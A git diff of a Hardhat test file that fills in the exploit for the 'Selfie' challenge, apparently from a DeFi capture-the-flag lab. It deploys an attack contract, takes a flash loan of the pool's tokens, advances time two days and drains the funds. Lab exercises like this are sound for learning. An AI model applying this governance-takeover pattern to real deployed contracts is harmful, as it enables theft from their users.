@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const {BigNumber} = require('BigNumber.js')
 
 describe('[Challenge] Selfie', function () {
     let deployer, attacker;
@@ -31,6 +32,17 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackerFactory = await ethers.getContractFactory('SelfieAttack', attacker);
+        const attackContract = await AttackerFactory.deploy(this.pool.address, this.governance.address, attacker.address, this.token.address);
+        // this.governance.on("ActionQueued", (actionid, caller) => {
+        //     console.log("What the fuck");
+        //     console.log(actionid);
+        //     console.log(caller);
+        // })
+        await attackContract.flashMe(TOKENS_IN_POOL);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+        await attackContract.drainFunds();
+
     });
 
     after(async function () {
